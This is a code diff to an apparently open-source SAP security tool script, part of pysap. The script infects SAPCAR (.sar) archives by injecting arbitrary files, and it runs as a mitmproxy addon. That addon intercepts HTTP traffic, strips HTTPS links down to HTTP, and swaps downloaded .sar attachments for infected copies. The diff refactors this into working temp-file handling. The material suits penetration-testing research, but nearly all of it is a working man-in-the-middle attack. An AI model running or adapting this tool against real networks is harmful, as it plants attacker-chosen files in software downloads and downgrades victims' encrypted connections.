@@ -21,8 +21,9 @@
 # Standard imports
 import re
 import logging
+from os import unlink
 from os.path import exists
-from cStringIO import StringIO
+from tempfile import NamedTemporaryFile
 # External imports
 from optparse import OptionParser, OptionGroup
 # Custom imports
@@ -30,30 +31,17 @@ import pysap
 from pysap.SAPCAR import SAPCARArchive
 
 
-def infect_sar_file(inject_files, sar_filename=None, sar_file=None):
+def infect_sar_file(sar_filename, inject_files):
     """ Receives a SAR file and infects it by adding new files
-
-    :type inject_files: list of strings
-    :param inject_files: list of files to inject into the SAR file
 
     :type sar_filename: string
     :param sar_filename: name of the SAR file to infect
 
-    :type sar_file: string
-    :param sar_file: content of the SAR file to infect
-
-    :rtype: tuple of int, string
-    :return: the new SAR file with the files injected
+    :type inject_files: list of strings
+    :param inject_files: list of files to inject into the SAR file
     """
 
-    # Properly open the file provided as input
-    if sar_filename:
-        sar = SAPCARArchive(sar_filename, "r+")
-    elif sar_file:
-        sar_fd = StringIO(sar_file)
-        sar = SAPCARArchive(sar_fd, "r+")
-    else:
-        raise Exception("Must provide a filename or a file content")
+    sar = SAPCARArchive(sar_filename, "r+")
 
     # Add each of the files specified as inject files
     for filename, archive_filename in inject_files:
@@ -61,9 +49,6 @@ def infect_sar_file(inject_files, sar_filename=None, sar_file=None):
 
     # Writes the modified file
     sar.write()
-
-    new_sar_file = sar.raw()
-    return len(new_sar_file), new_sar_file
 
 
 # Command line options parser
@@ -76,7 +61,10 @@ def parse_options(args=None, req_filename=True):
                                                          "url": pysap.__url__,
                                                          "repo": pysap.__repo__}
 
-    usage = "Usage: %prog [options] -f <sar_filename> [<filename> <archive filename>]"
+    usage = "Usage: %prog [options] "
+    if req_filename:
+        usage += "-f <sar_filename> "
+    usage += "[<filename> <archive filename>]"
 
     parser = OptionParser(usage=usage, description=description, epilog=epilog)
 
@@ -91,7 +79,9 @@ def parse_options(args=None, req_filename=True):
 
     (options, args) = parser.parse_args(args)
 
-    if req_filename and not options.sar_filename:
+    if not req_filename:
+        args.pop(0)
+    elif req_filename and not options.sar_filename:
         parser.error("Must provide a file to infect!")
 
     if len(args) < 2 or len(args) % 2 != 0:
@@ -122,7 +112,7 @@ def main():
             return
         print("[*]\t%s\tas\t%s" % (filename, archive_filename))
 
-    infect_sar_file(inject_files, sar_filename=options.sar_filename)
+    infect_sar_file(options.sar_filename, inject_files)
 
 
 # Mitmproxy start event function
@@ -134,6 +124,10 @@ def start(context, argv):
 
     if options.verbose:
         logging.basicConfig(level=logging.DEBUG)
+
+    for (filename, archive_filename) in context.inject_files:
+        if not exists(filename):
+            raise ValueError("File to inject '%s' doesn't exist" % filename)
 
 
 # Mitmproxy request event function
@@ -149,7 +143,6 @@ def request(context, flow):
 
 # Mitmproxy response event function
 def response(context, flow):
-    from six.moves import urllib
     from netlib.http import decoded
 
     with decoded(flow.response):
@@ -161,16 +154,33 @@ def response(context, flow):
         if "content-disposition" in flow.response.headers:
             content_disposition = flow.response.headers.get("content-disposition").lower()
             if content_disposition.startswith("attachment") and content_disposition.endswith(".sar"):
-                len, content = infect_sar_file(flow.response.content, context.inject_files)
-                flow.response.headers["content-length"] = len
+                context.log("SAR file attachment found (%s bytes)" % flow.response.headers["content-length"])
+                fil = NamedTemporaryFile(delete=False)
+                fil.write(flow.response.content)
+                fil.close()
+                context.log("SAR file temporally stored as '%s'" % fil.name)
+
+                infect_sar_file(fil.name, context.inject_files)
+                context.log("SAR file infected !")
+
+                with open(fil.name, "r") as new_fil:
+                    content = new_fil.read()
+
                 flow.response.content = content
+                flow.response.headers["content-length"] = str(len(content))
+                context.log("Returning infected SAR file (new size %s bytes)" % flow.response.headers["content-length"])
+
+                unlink(fil.name)
+                context.log("Removed temporally file '%s'" % fil.name)
+
         else:
             # Strip links in response body
             flow.response.content = flow.response.content.replace('https://', 'http://')
 
         # Strip links in 'Location' header
-        if flow.response.headers.get('Location','').startswith('https://'):
+        if flow.response.headers.get('Location', '').startswith('https://'):
             location = flow.response.headers['Location']
+            from six.moves import urllib
             hostname = urllib.parse.urlparse(location).hostname
             if hostname:
                 context.secure_hosts.add(hostname)
